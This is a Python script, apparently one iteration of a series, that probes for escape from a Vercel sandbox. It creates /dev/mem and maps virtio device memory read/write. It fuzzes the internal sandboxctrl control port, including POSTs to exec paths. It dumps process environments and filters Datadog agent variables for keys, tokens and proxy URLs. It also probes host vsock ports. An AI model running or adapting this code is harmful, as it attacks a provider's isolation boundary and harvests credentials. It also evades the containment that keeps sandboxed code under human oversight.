# -*- coding: utf-8 -*-
"""v101 payload: J288 virtio 直写初探 + sandboxctrl 23456 深挖 + 进程详情
L1 mknod /dev/mem + mmap 5 个 virtio MMIO BAR, 识别设备
L2 sandboxctrl 23456 H2/HTTP 路由深挖
L3 sandboxctrl(535) 进程详情 + celld 相关 socket inode 归属
L4 datadog agent 进程定位
L5 vsock 1025 协议再试
输出 /vercel/sandbox/v101c.out"""
import os, socket, struct, time, subprocess, glob, signal, ctypes

OUT = '/vercel/sandbox/v101c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(240)


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def sh(cmd, t=6):
    try:
        r = subprocess.run(['/bin/sh', '-c', cmd], capture_output=True, timeout=t)
        return (r.stdout or b'') + (r.stderr or b'')
    except Exception as e:
        return ('EXC %s' % type(e).__name__).encode()


# ---------- L1 /dev/mem + virtio MMIO ----------
log('=== L1 virtio MMIO ===')
log('mknod: ' + sh('mknod /dev/mem c 1 1 2>&1; ls -la /dev/mem 2>&1').decode(errors='replace')[:200])
libc = ctypes.CDLL(None, use_errno=True)
libc.open.restype = ctypes.c_int
libc.open.argtypes = [ctypes.c_char_p, ctypes.c_int]
libc.mmap.restype = ctypes.c_void_p
libc.mmap.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_long]
PROT_RW = 3
MAP_SHARED = 1
fd = libc.open(b'/dev/mem', 2)  # O_RDWR
log('/dev/mem fd=%d errno=%d' % (fd, ctypes.get_errno()))
if fd > 0:
    regions = [('virtio0', 0xc0001000), ('virtio1', 0xc0002000), ('virtio2', 0xc0003000),
               ('virtio3', 0xc0004000), ('virtio4', 0xc0005000)]
    for name, base in regions:
        try:
            m = libc.mmap(None, 0x1000, PROT_RW, MAP_SHARED, fd, base)
            if m in (ctypes.c_void_p(-1).value, 0):
                log('%s mmap FAIL errno=%d' % (name, ctypes.get_errno()))
                continue
            words = [ctypes.c_uint32.from_address(m + i).value for i in range(0, 0x40, 4)]
            log('%s @0x%x: %s' % (name, base, ' '.join('%08x' % w for w in words)))
            ctypes.CDLL(None).munmap(m, 0x1000)
        except Exception as e:
            log('%s EXC %s' % (name, type(e).__name__))
    ctypes.CDLL(None).close(fd)
else:
    log('open /dev/mem FAIL errno=%d' % ctypes.get_errno())


# ---------- L2 sandboxctrl 23456 深挖 ----------
log('=== L2 sandboxctrl 23456 ===')


def h2_frame(t, flags, stream, payload):
    return struct.pack('>I', len(payload))[1:] + bytes([t, flags]) + struct.pack('>I', stream) + payload


def sbc_req(method, path, body=b'', t=2.0):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(('127.0.0.1', 23456))
        s.sendall(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
        s.sendall(h2_frame(4, 0, 0, b''))
        time.sleep(0.2)
        try:
            d0 = s.recv(1024)
        except Exception:
            d0 = b''
        if d0:
            s.sendall(h2_frame(4, 1, 0, b''))
        m = b'\x82' if method == 'GET' else b'\x83'
        hp = m + b'\x86' + b'\x44' + bytes([len(path)]) + path.encode() + b'\x41\x09localhost'
        s.sendall(h2_frame(1, 0x5, 1, hp))
        if body:
            s.sendall(h2_frame(0, 0x1, 1, body))
        d2 = b''
        try:
            while len(d2) < 65536:
                c = s.recv(8192)
                if not c:
                    break
                d2 += c
        except Exception:
            pass
        # 解析帧
        info = []
        off = 0
        while off + 9 <= len(d2):
            ln = int.from_bytes(d2[off:off + 3], 'big')
            typ = d2[off + 3]
            pay = d2[off + 9:off + 9 + ln]
            if typ == 1:
                info.append('HDR[%s]' % pay.hex()[:120])
            elif typ == 0:
                info.append('DATA[%s]' % pay.decode('latin1', 'replace')[:100])
            elif typ == 7:
                info.append('GOAWAY[%s]' % pay[-4:].hex())
            elif typ == 2:
                info.append('RST[%s]' % pay[:4].hex())
            else:
                info.append('T%d[%s]' % (typ, pay[:40].hex()))
            off += 9 + ln
        log('SBC H2 %s %s -> %dB %s' % (method, path, len(d2), ';'.join(info)[:400]))
        s.close()
    except Exception as e:
        log('SBC H2 %s %s EXC %s' % (method, path, type(e).__name__))


for path in ['/', '/health', '/healthz', '/api', '/api/v1', '/v1', '/sandbox', '/sandboxes',
             '/control', '/control/v1', '/status', '/version', '/info', '/debug', '/metrics']:
    sbc_req('GET', path)
for path in ['/', '/api/v1/sandbox', '/sandbox/exec', '/v1/exec']:
    sbc_req('POST', path, b'{}')
# HTTP/1.1 路径字典
for path in ['/', '/api', '/v1', '/health', '/status']:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.5)
        s.connect(('127.0.0.1', 23456))
        s.sendall(b'GET %s HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n' % path.encode())
        d = b''
        try:
            while len(d) < 8192:
                c = s.recv(4096)
                if not c:
                    break
                d += c
        except Exception:
            pass
        log('SBC HTTP1 GET %s -> %dB %r' % (path, len(d), d[:200]))
        s.close()
    except Exception as e:
        log('SBC HTTP1 GET %s EXC %s' % (path, type(e).__name__))


# ---------- L3 sandboxctrl 进程详情 ----------
log('=== L3 sandboxctrl proc ===')
for pid in ['535', '1', '490', '579']:
    try:
        cmd = open('/proc/%s/cmdline' % pid, 'rb').read().replace(b'\x00', b' ').decode(errors='replace')[:200]
        env = open('/proc/%s/environ' % pid, 'rb').read()
        envs = [e.decode('latin1') for e in env.split(b'\x00') if e]
        log('PID %s cmd=%s' % (pid, cmd))
        log('PID %s env: %s' % (pid, '; '.join(envs[:25])))
    except Exception as e:
        log('PID %s EXC %s' % (pid, type(e).__name__))
# sandboxctrl 的 socket 对端 (inode 1255 连接)
t6 = open('/proc/net/tcp6', errors='replace').read()
for ln in t6.splitlines()[1:]:
    p = ln.split()
    if len(p) > 9 and p[9] in ('1139', '1255'):
        laddr, raddr, st = p[1], p[2], p[3]
        lp = int(laddr.split(':')[-1], 16)
        rp = int(raddr.split(':')[-1], 16)
        lip = socket.inet_ntop(socket.AF_INET6, bytes.fromhex(laddr.split(':')[0]))
        rip = socket.inet_ntop(socket.AF_INET6, bytes.fromhex(raddr.split(':')[0]))
        log('SBC sock inode=%s %s:%d <-> %s:%d st=%s' % (p[9], lip, lp, rip, rp, st))
# celld 的 socket inode 归属 (unix)
unix = open('/proc/net/unix', errors='replace').read()
for ln in unix.splitlines()[1:]:
    parts = ln.split()
    if len(parts) >= 8:
        ino = parts[6]
        name = parts[-1]
        if name.startswith('/run/') or name.startswith('@'):
            log('UNIX inode=%s %s' % (ino, name))


# ---------- L4 datadog agent 进程 ----------
log('=== L4 datadog procs ===')
for p in glob.glob('/proc/[0-9]*'):
    pid = p.split('/')[-1]
    try:
        comm = open(p + '/comm', errors='replace').read().strip()
    except Exception:
        continue
    if comm in ('agent', 'trace-agent', 'process-agent', 'security-agent', 'system-probe', 'datadog-agent'):
        try:
            cmd = open(p + '/cmdline', 'rb').read().replace(b'\x00', b' ').decode(errors='replace')[:150]
            exe = os.readlink(p + '/exe')
            env = open(p + '/environ', 'rb').read()
            envs = [e.decode('latin1') for e in env.split(b'\x00') if e and any(
                k in e.lower() for k in (b'key', b'token', b'url', b'host', b'proxy'))]
            log('DDAgent pid=%s comm=%s exe=%s cmd=%s env=%s' % (pid, comm, exe, cmd, '; '.join(envs[:15])))
        except Exception as e:
            log('DDAgent pid=%s comm=%s EXC %s' % (pid, comm, type(e).__name__))


# ---------- L5 vsock 1025 再探 ----------
log('=== L5 vsock 1025 ===')


def vsock_probe(port, data, label, t=1.5):
    try:
        s = socket.socket(40, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect((2, port))
        s.sendall(data)
        d = b''
        try:
            while len(d) < 16384:
                c = s.recv(4096)
                if not c:
                    break
                d += c
        except socket.timeout:
            pass
        log('VSOCK %d %s -> %dB %r' % (port, label, len(d), d[:200]))
        s.close()
    except Exception as e:
        log('VSOCK %d %s EXC %s' % (port, label, type(e).__name__))


vsock_probe(1025, b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n', 'h2pre')
vsock_probe(1025, b'\x00\x00\x00\x00\x00', 'grpc0')
vsock_probe(1025, b'GET / HTTP/1.0\r\n\r\n', 'http10')
vsock_probe(1024, b'GET / HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n', 'http1')

log('V101C_DONE')
f.close()
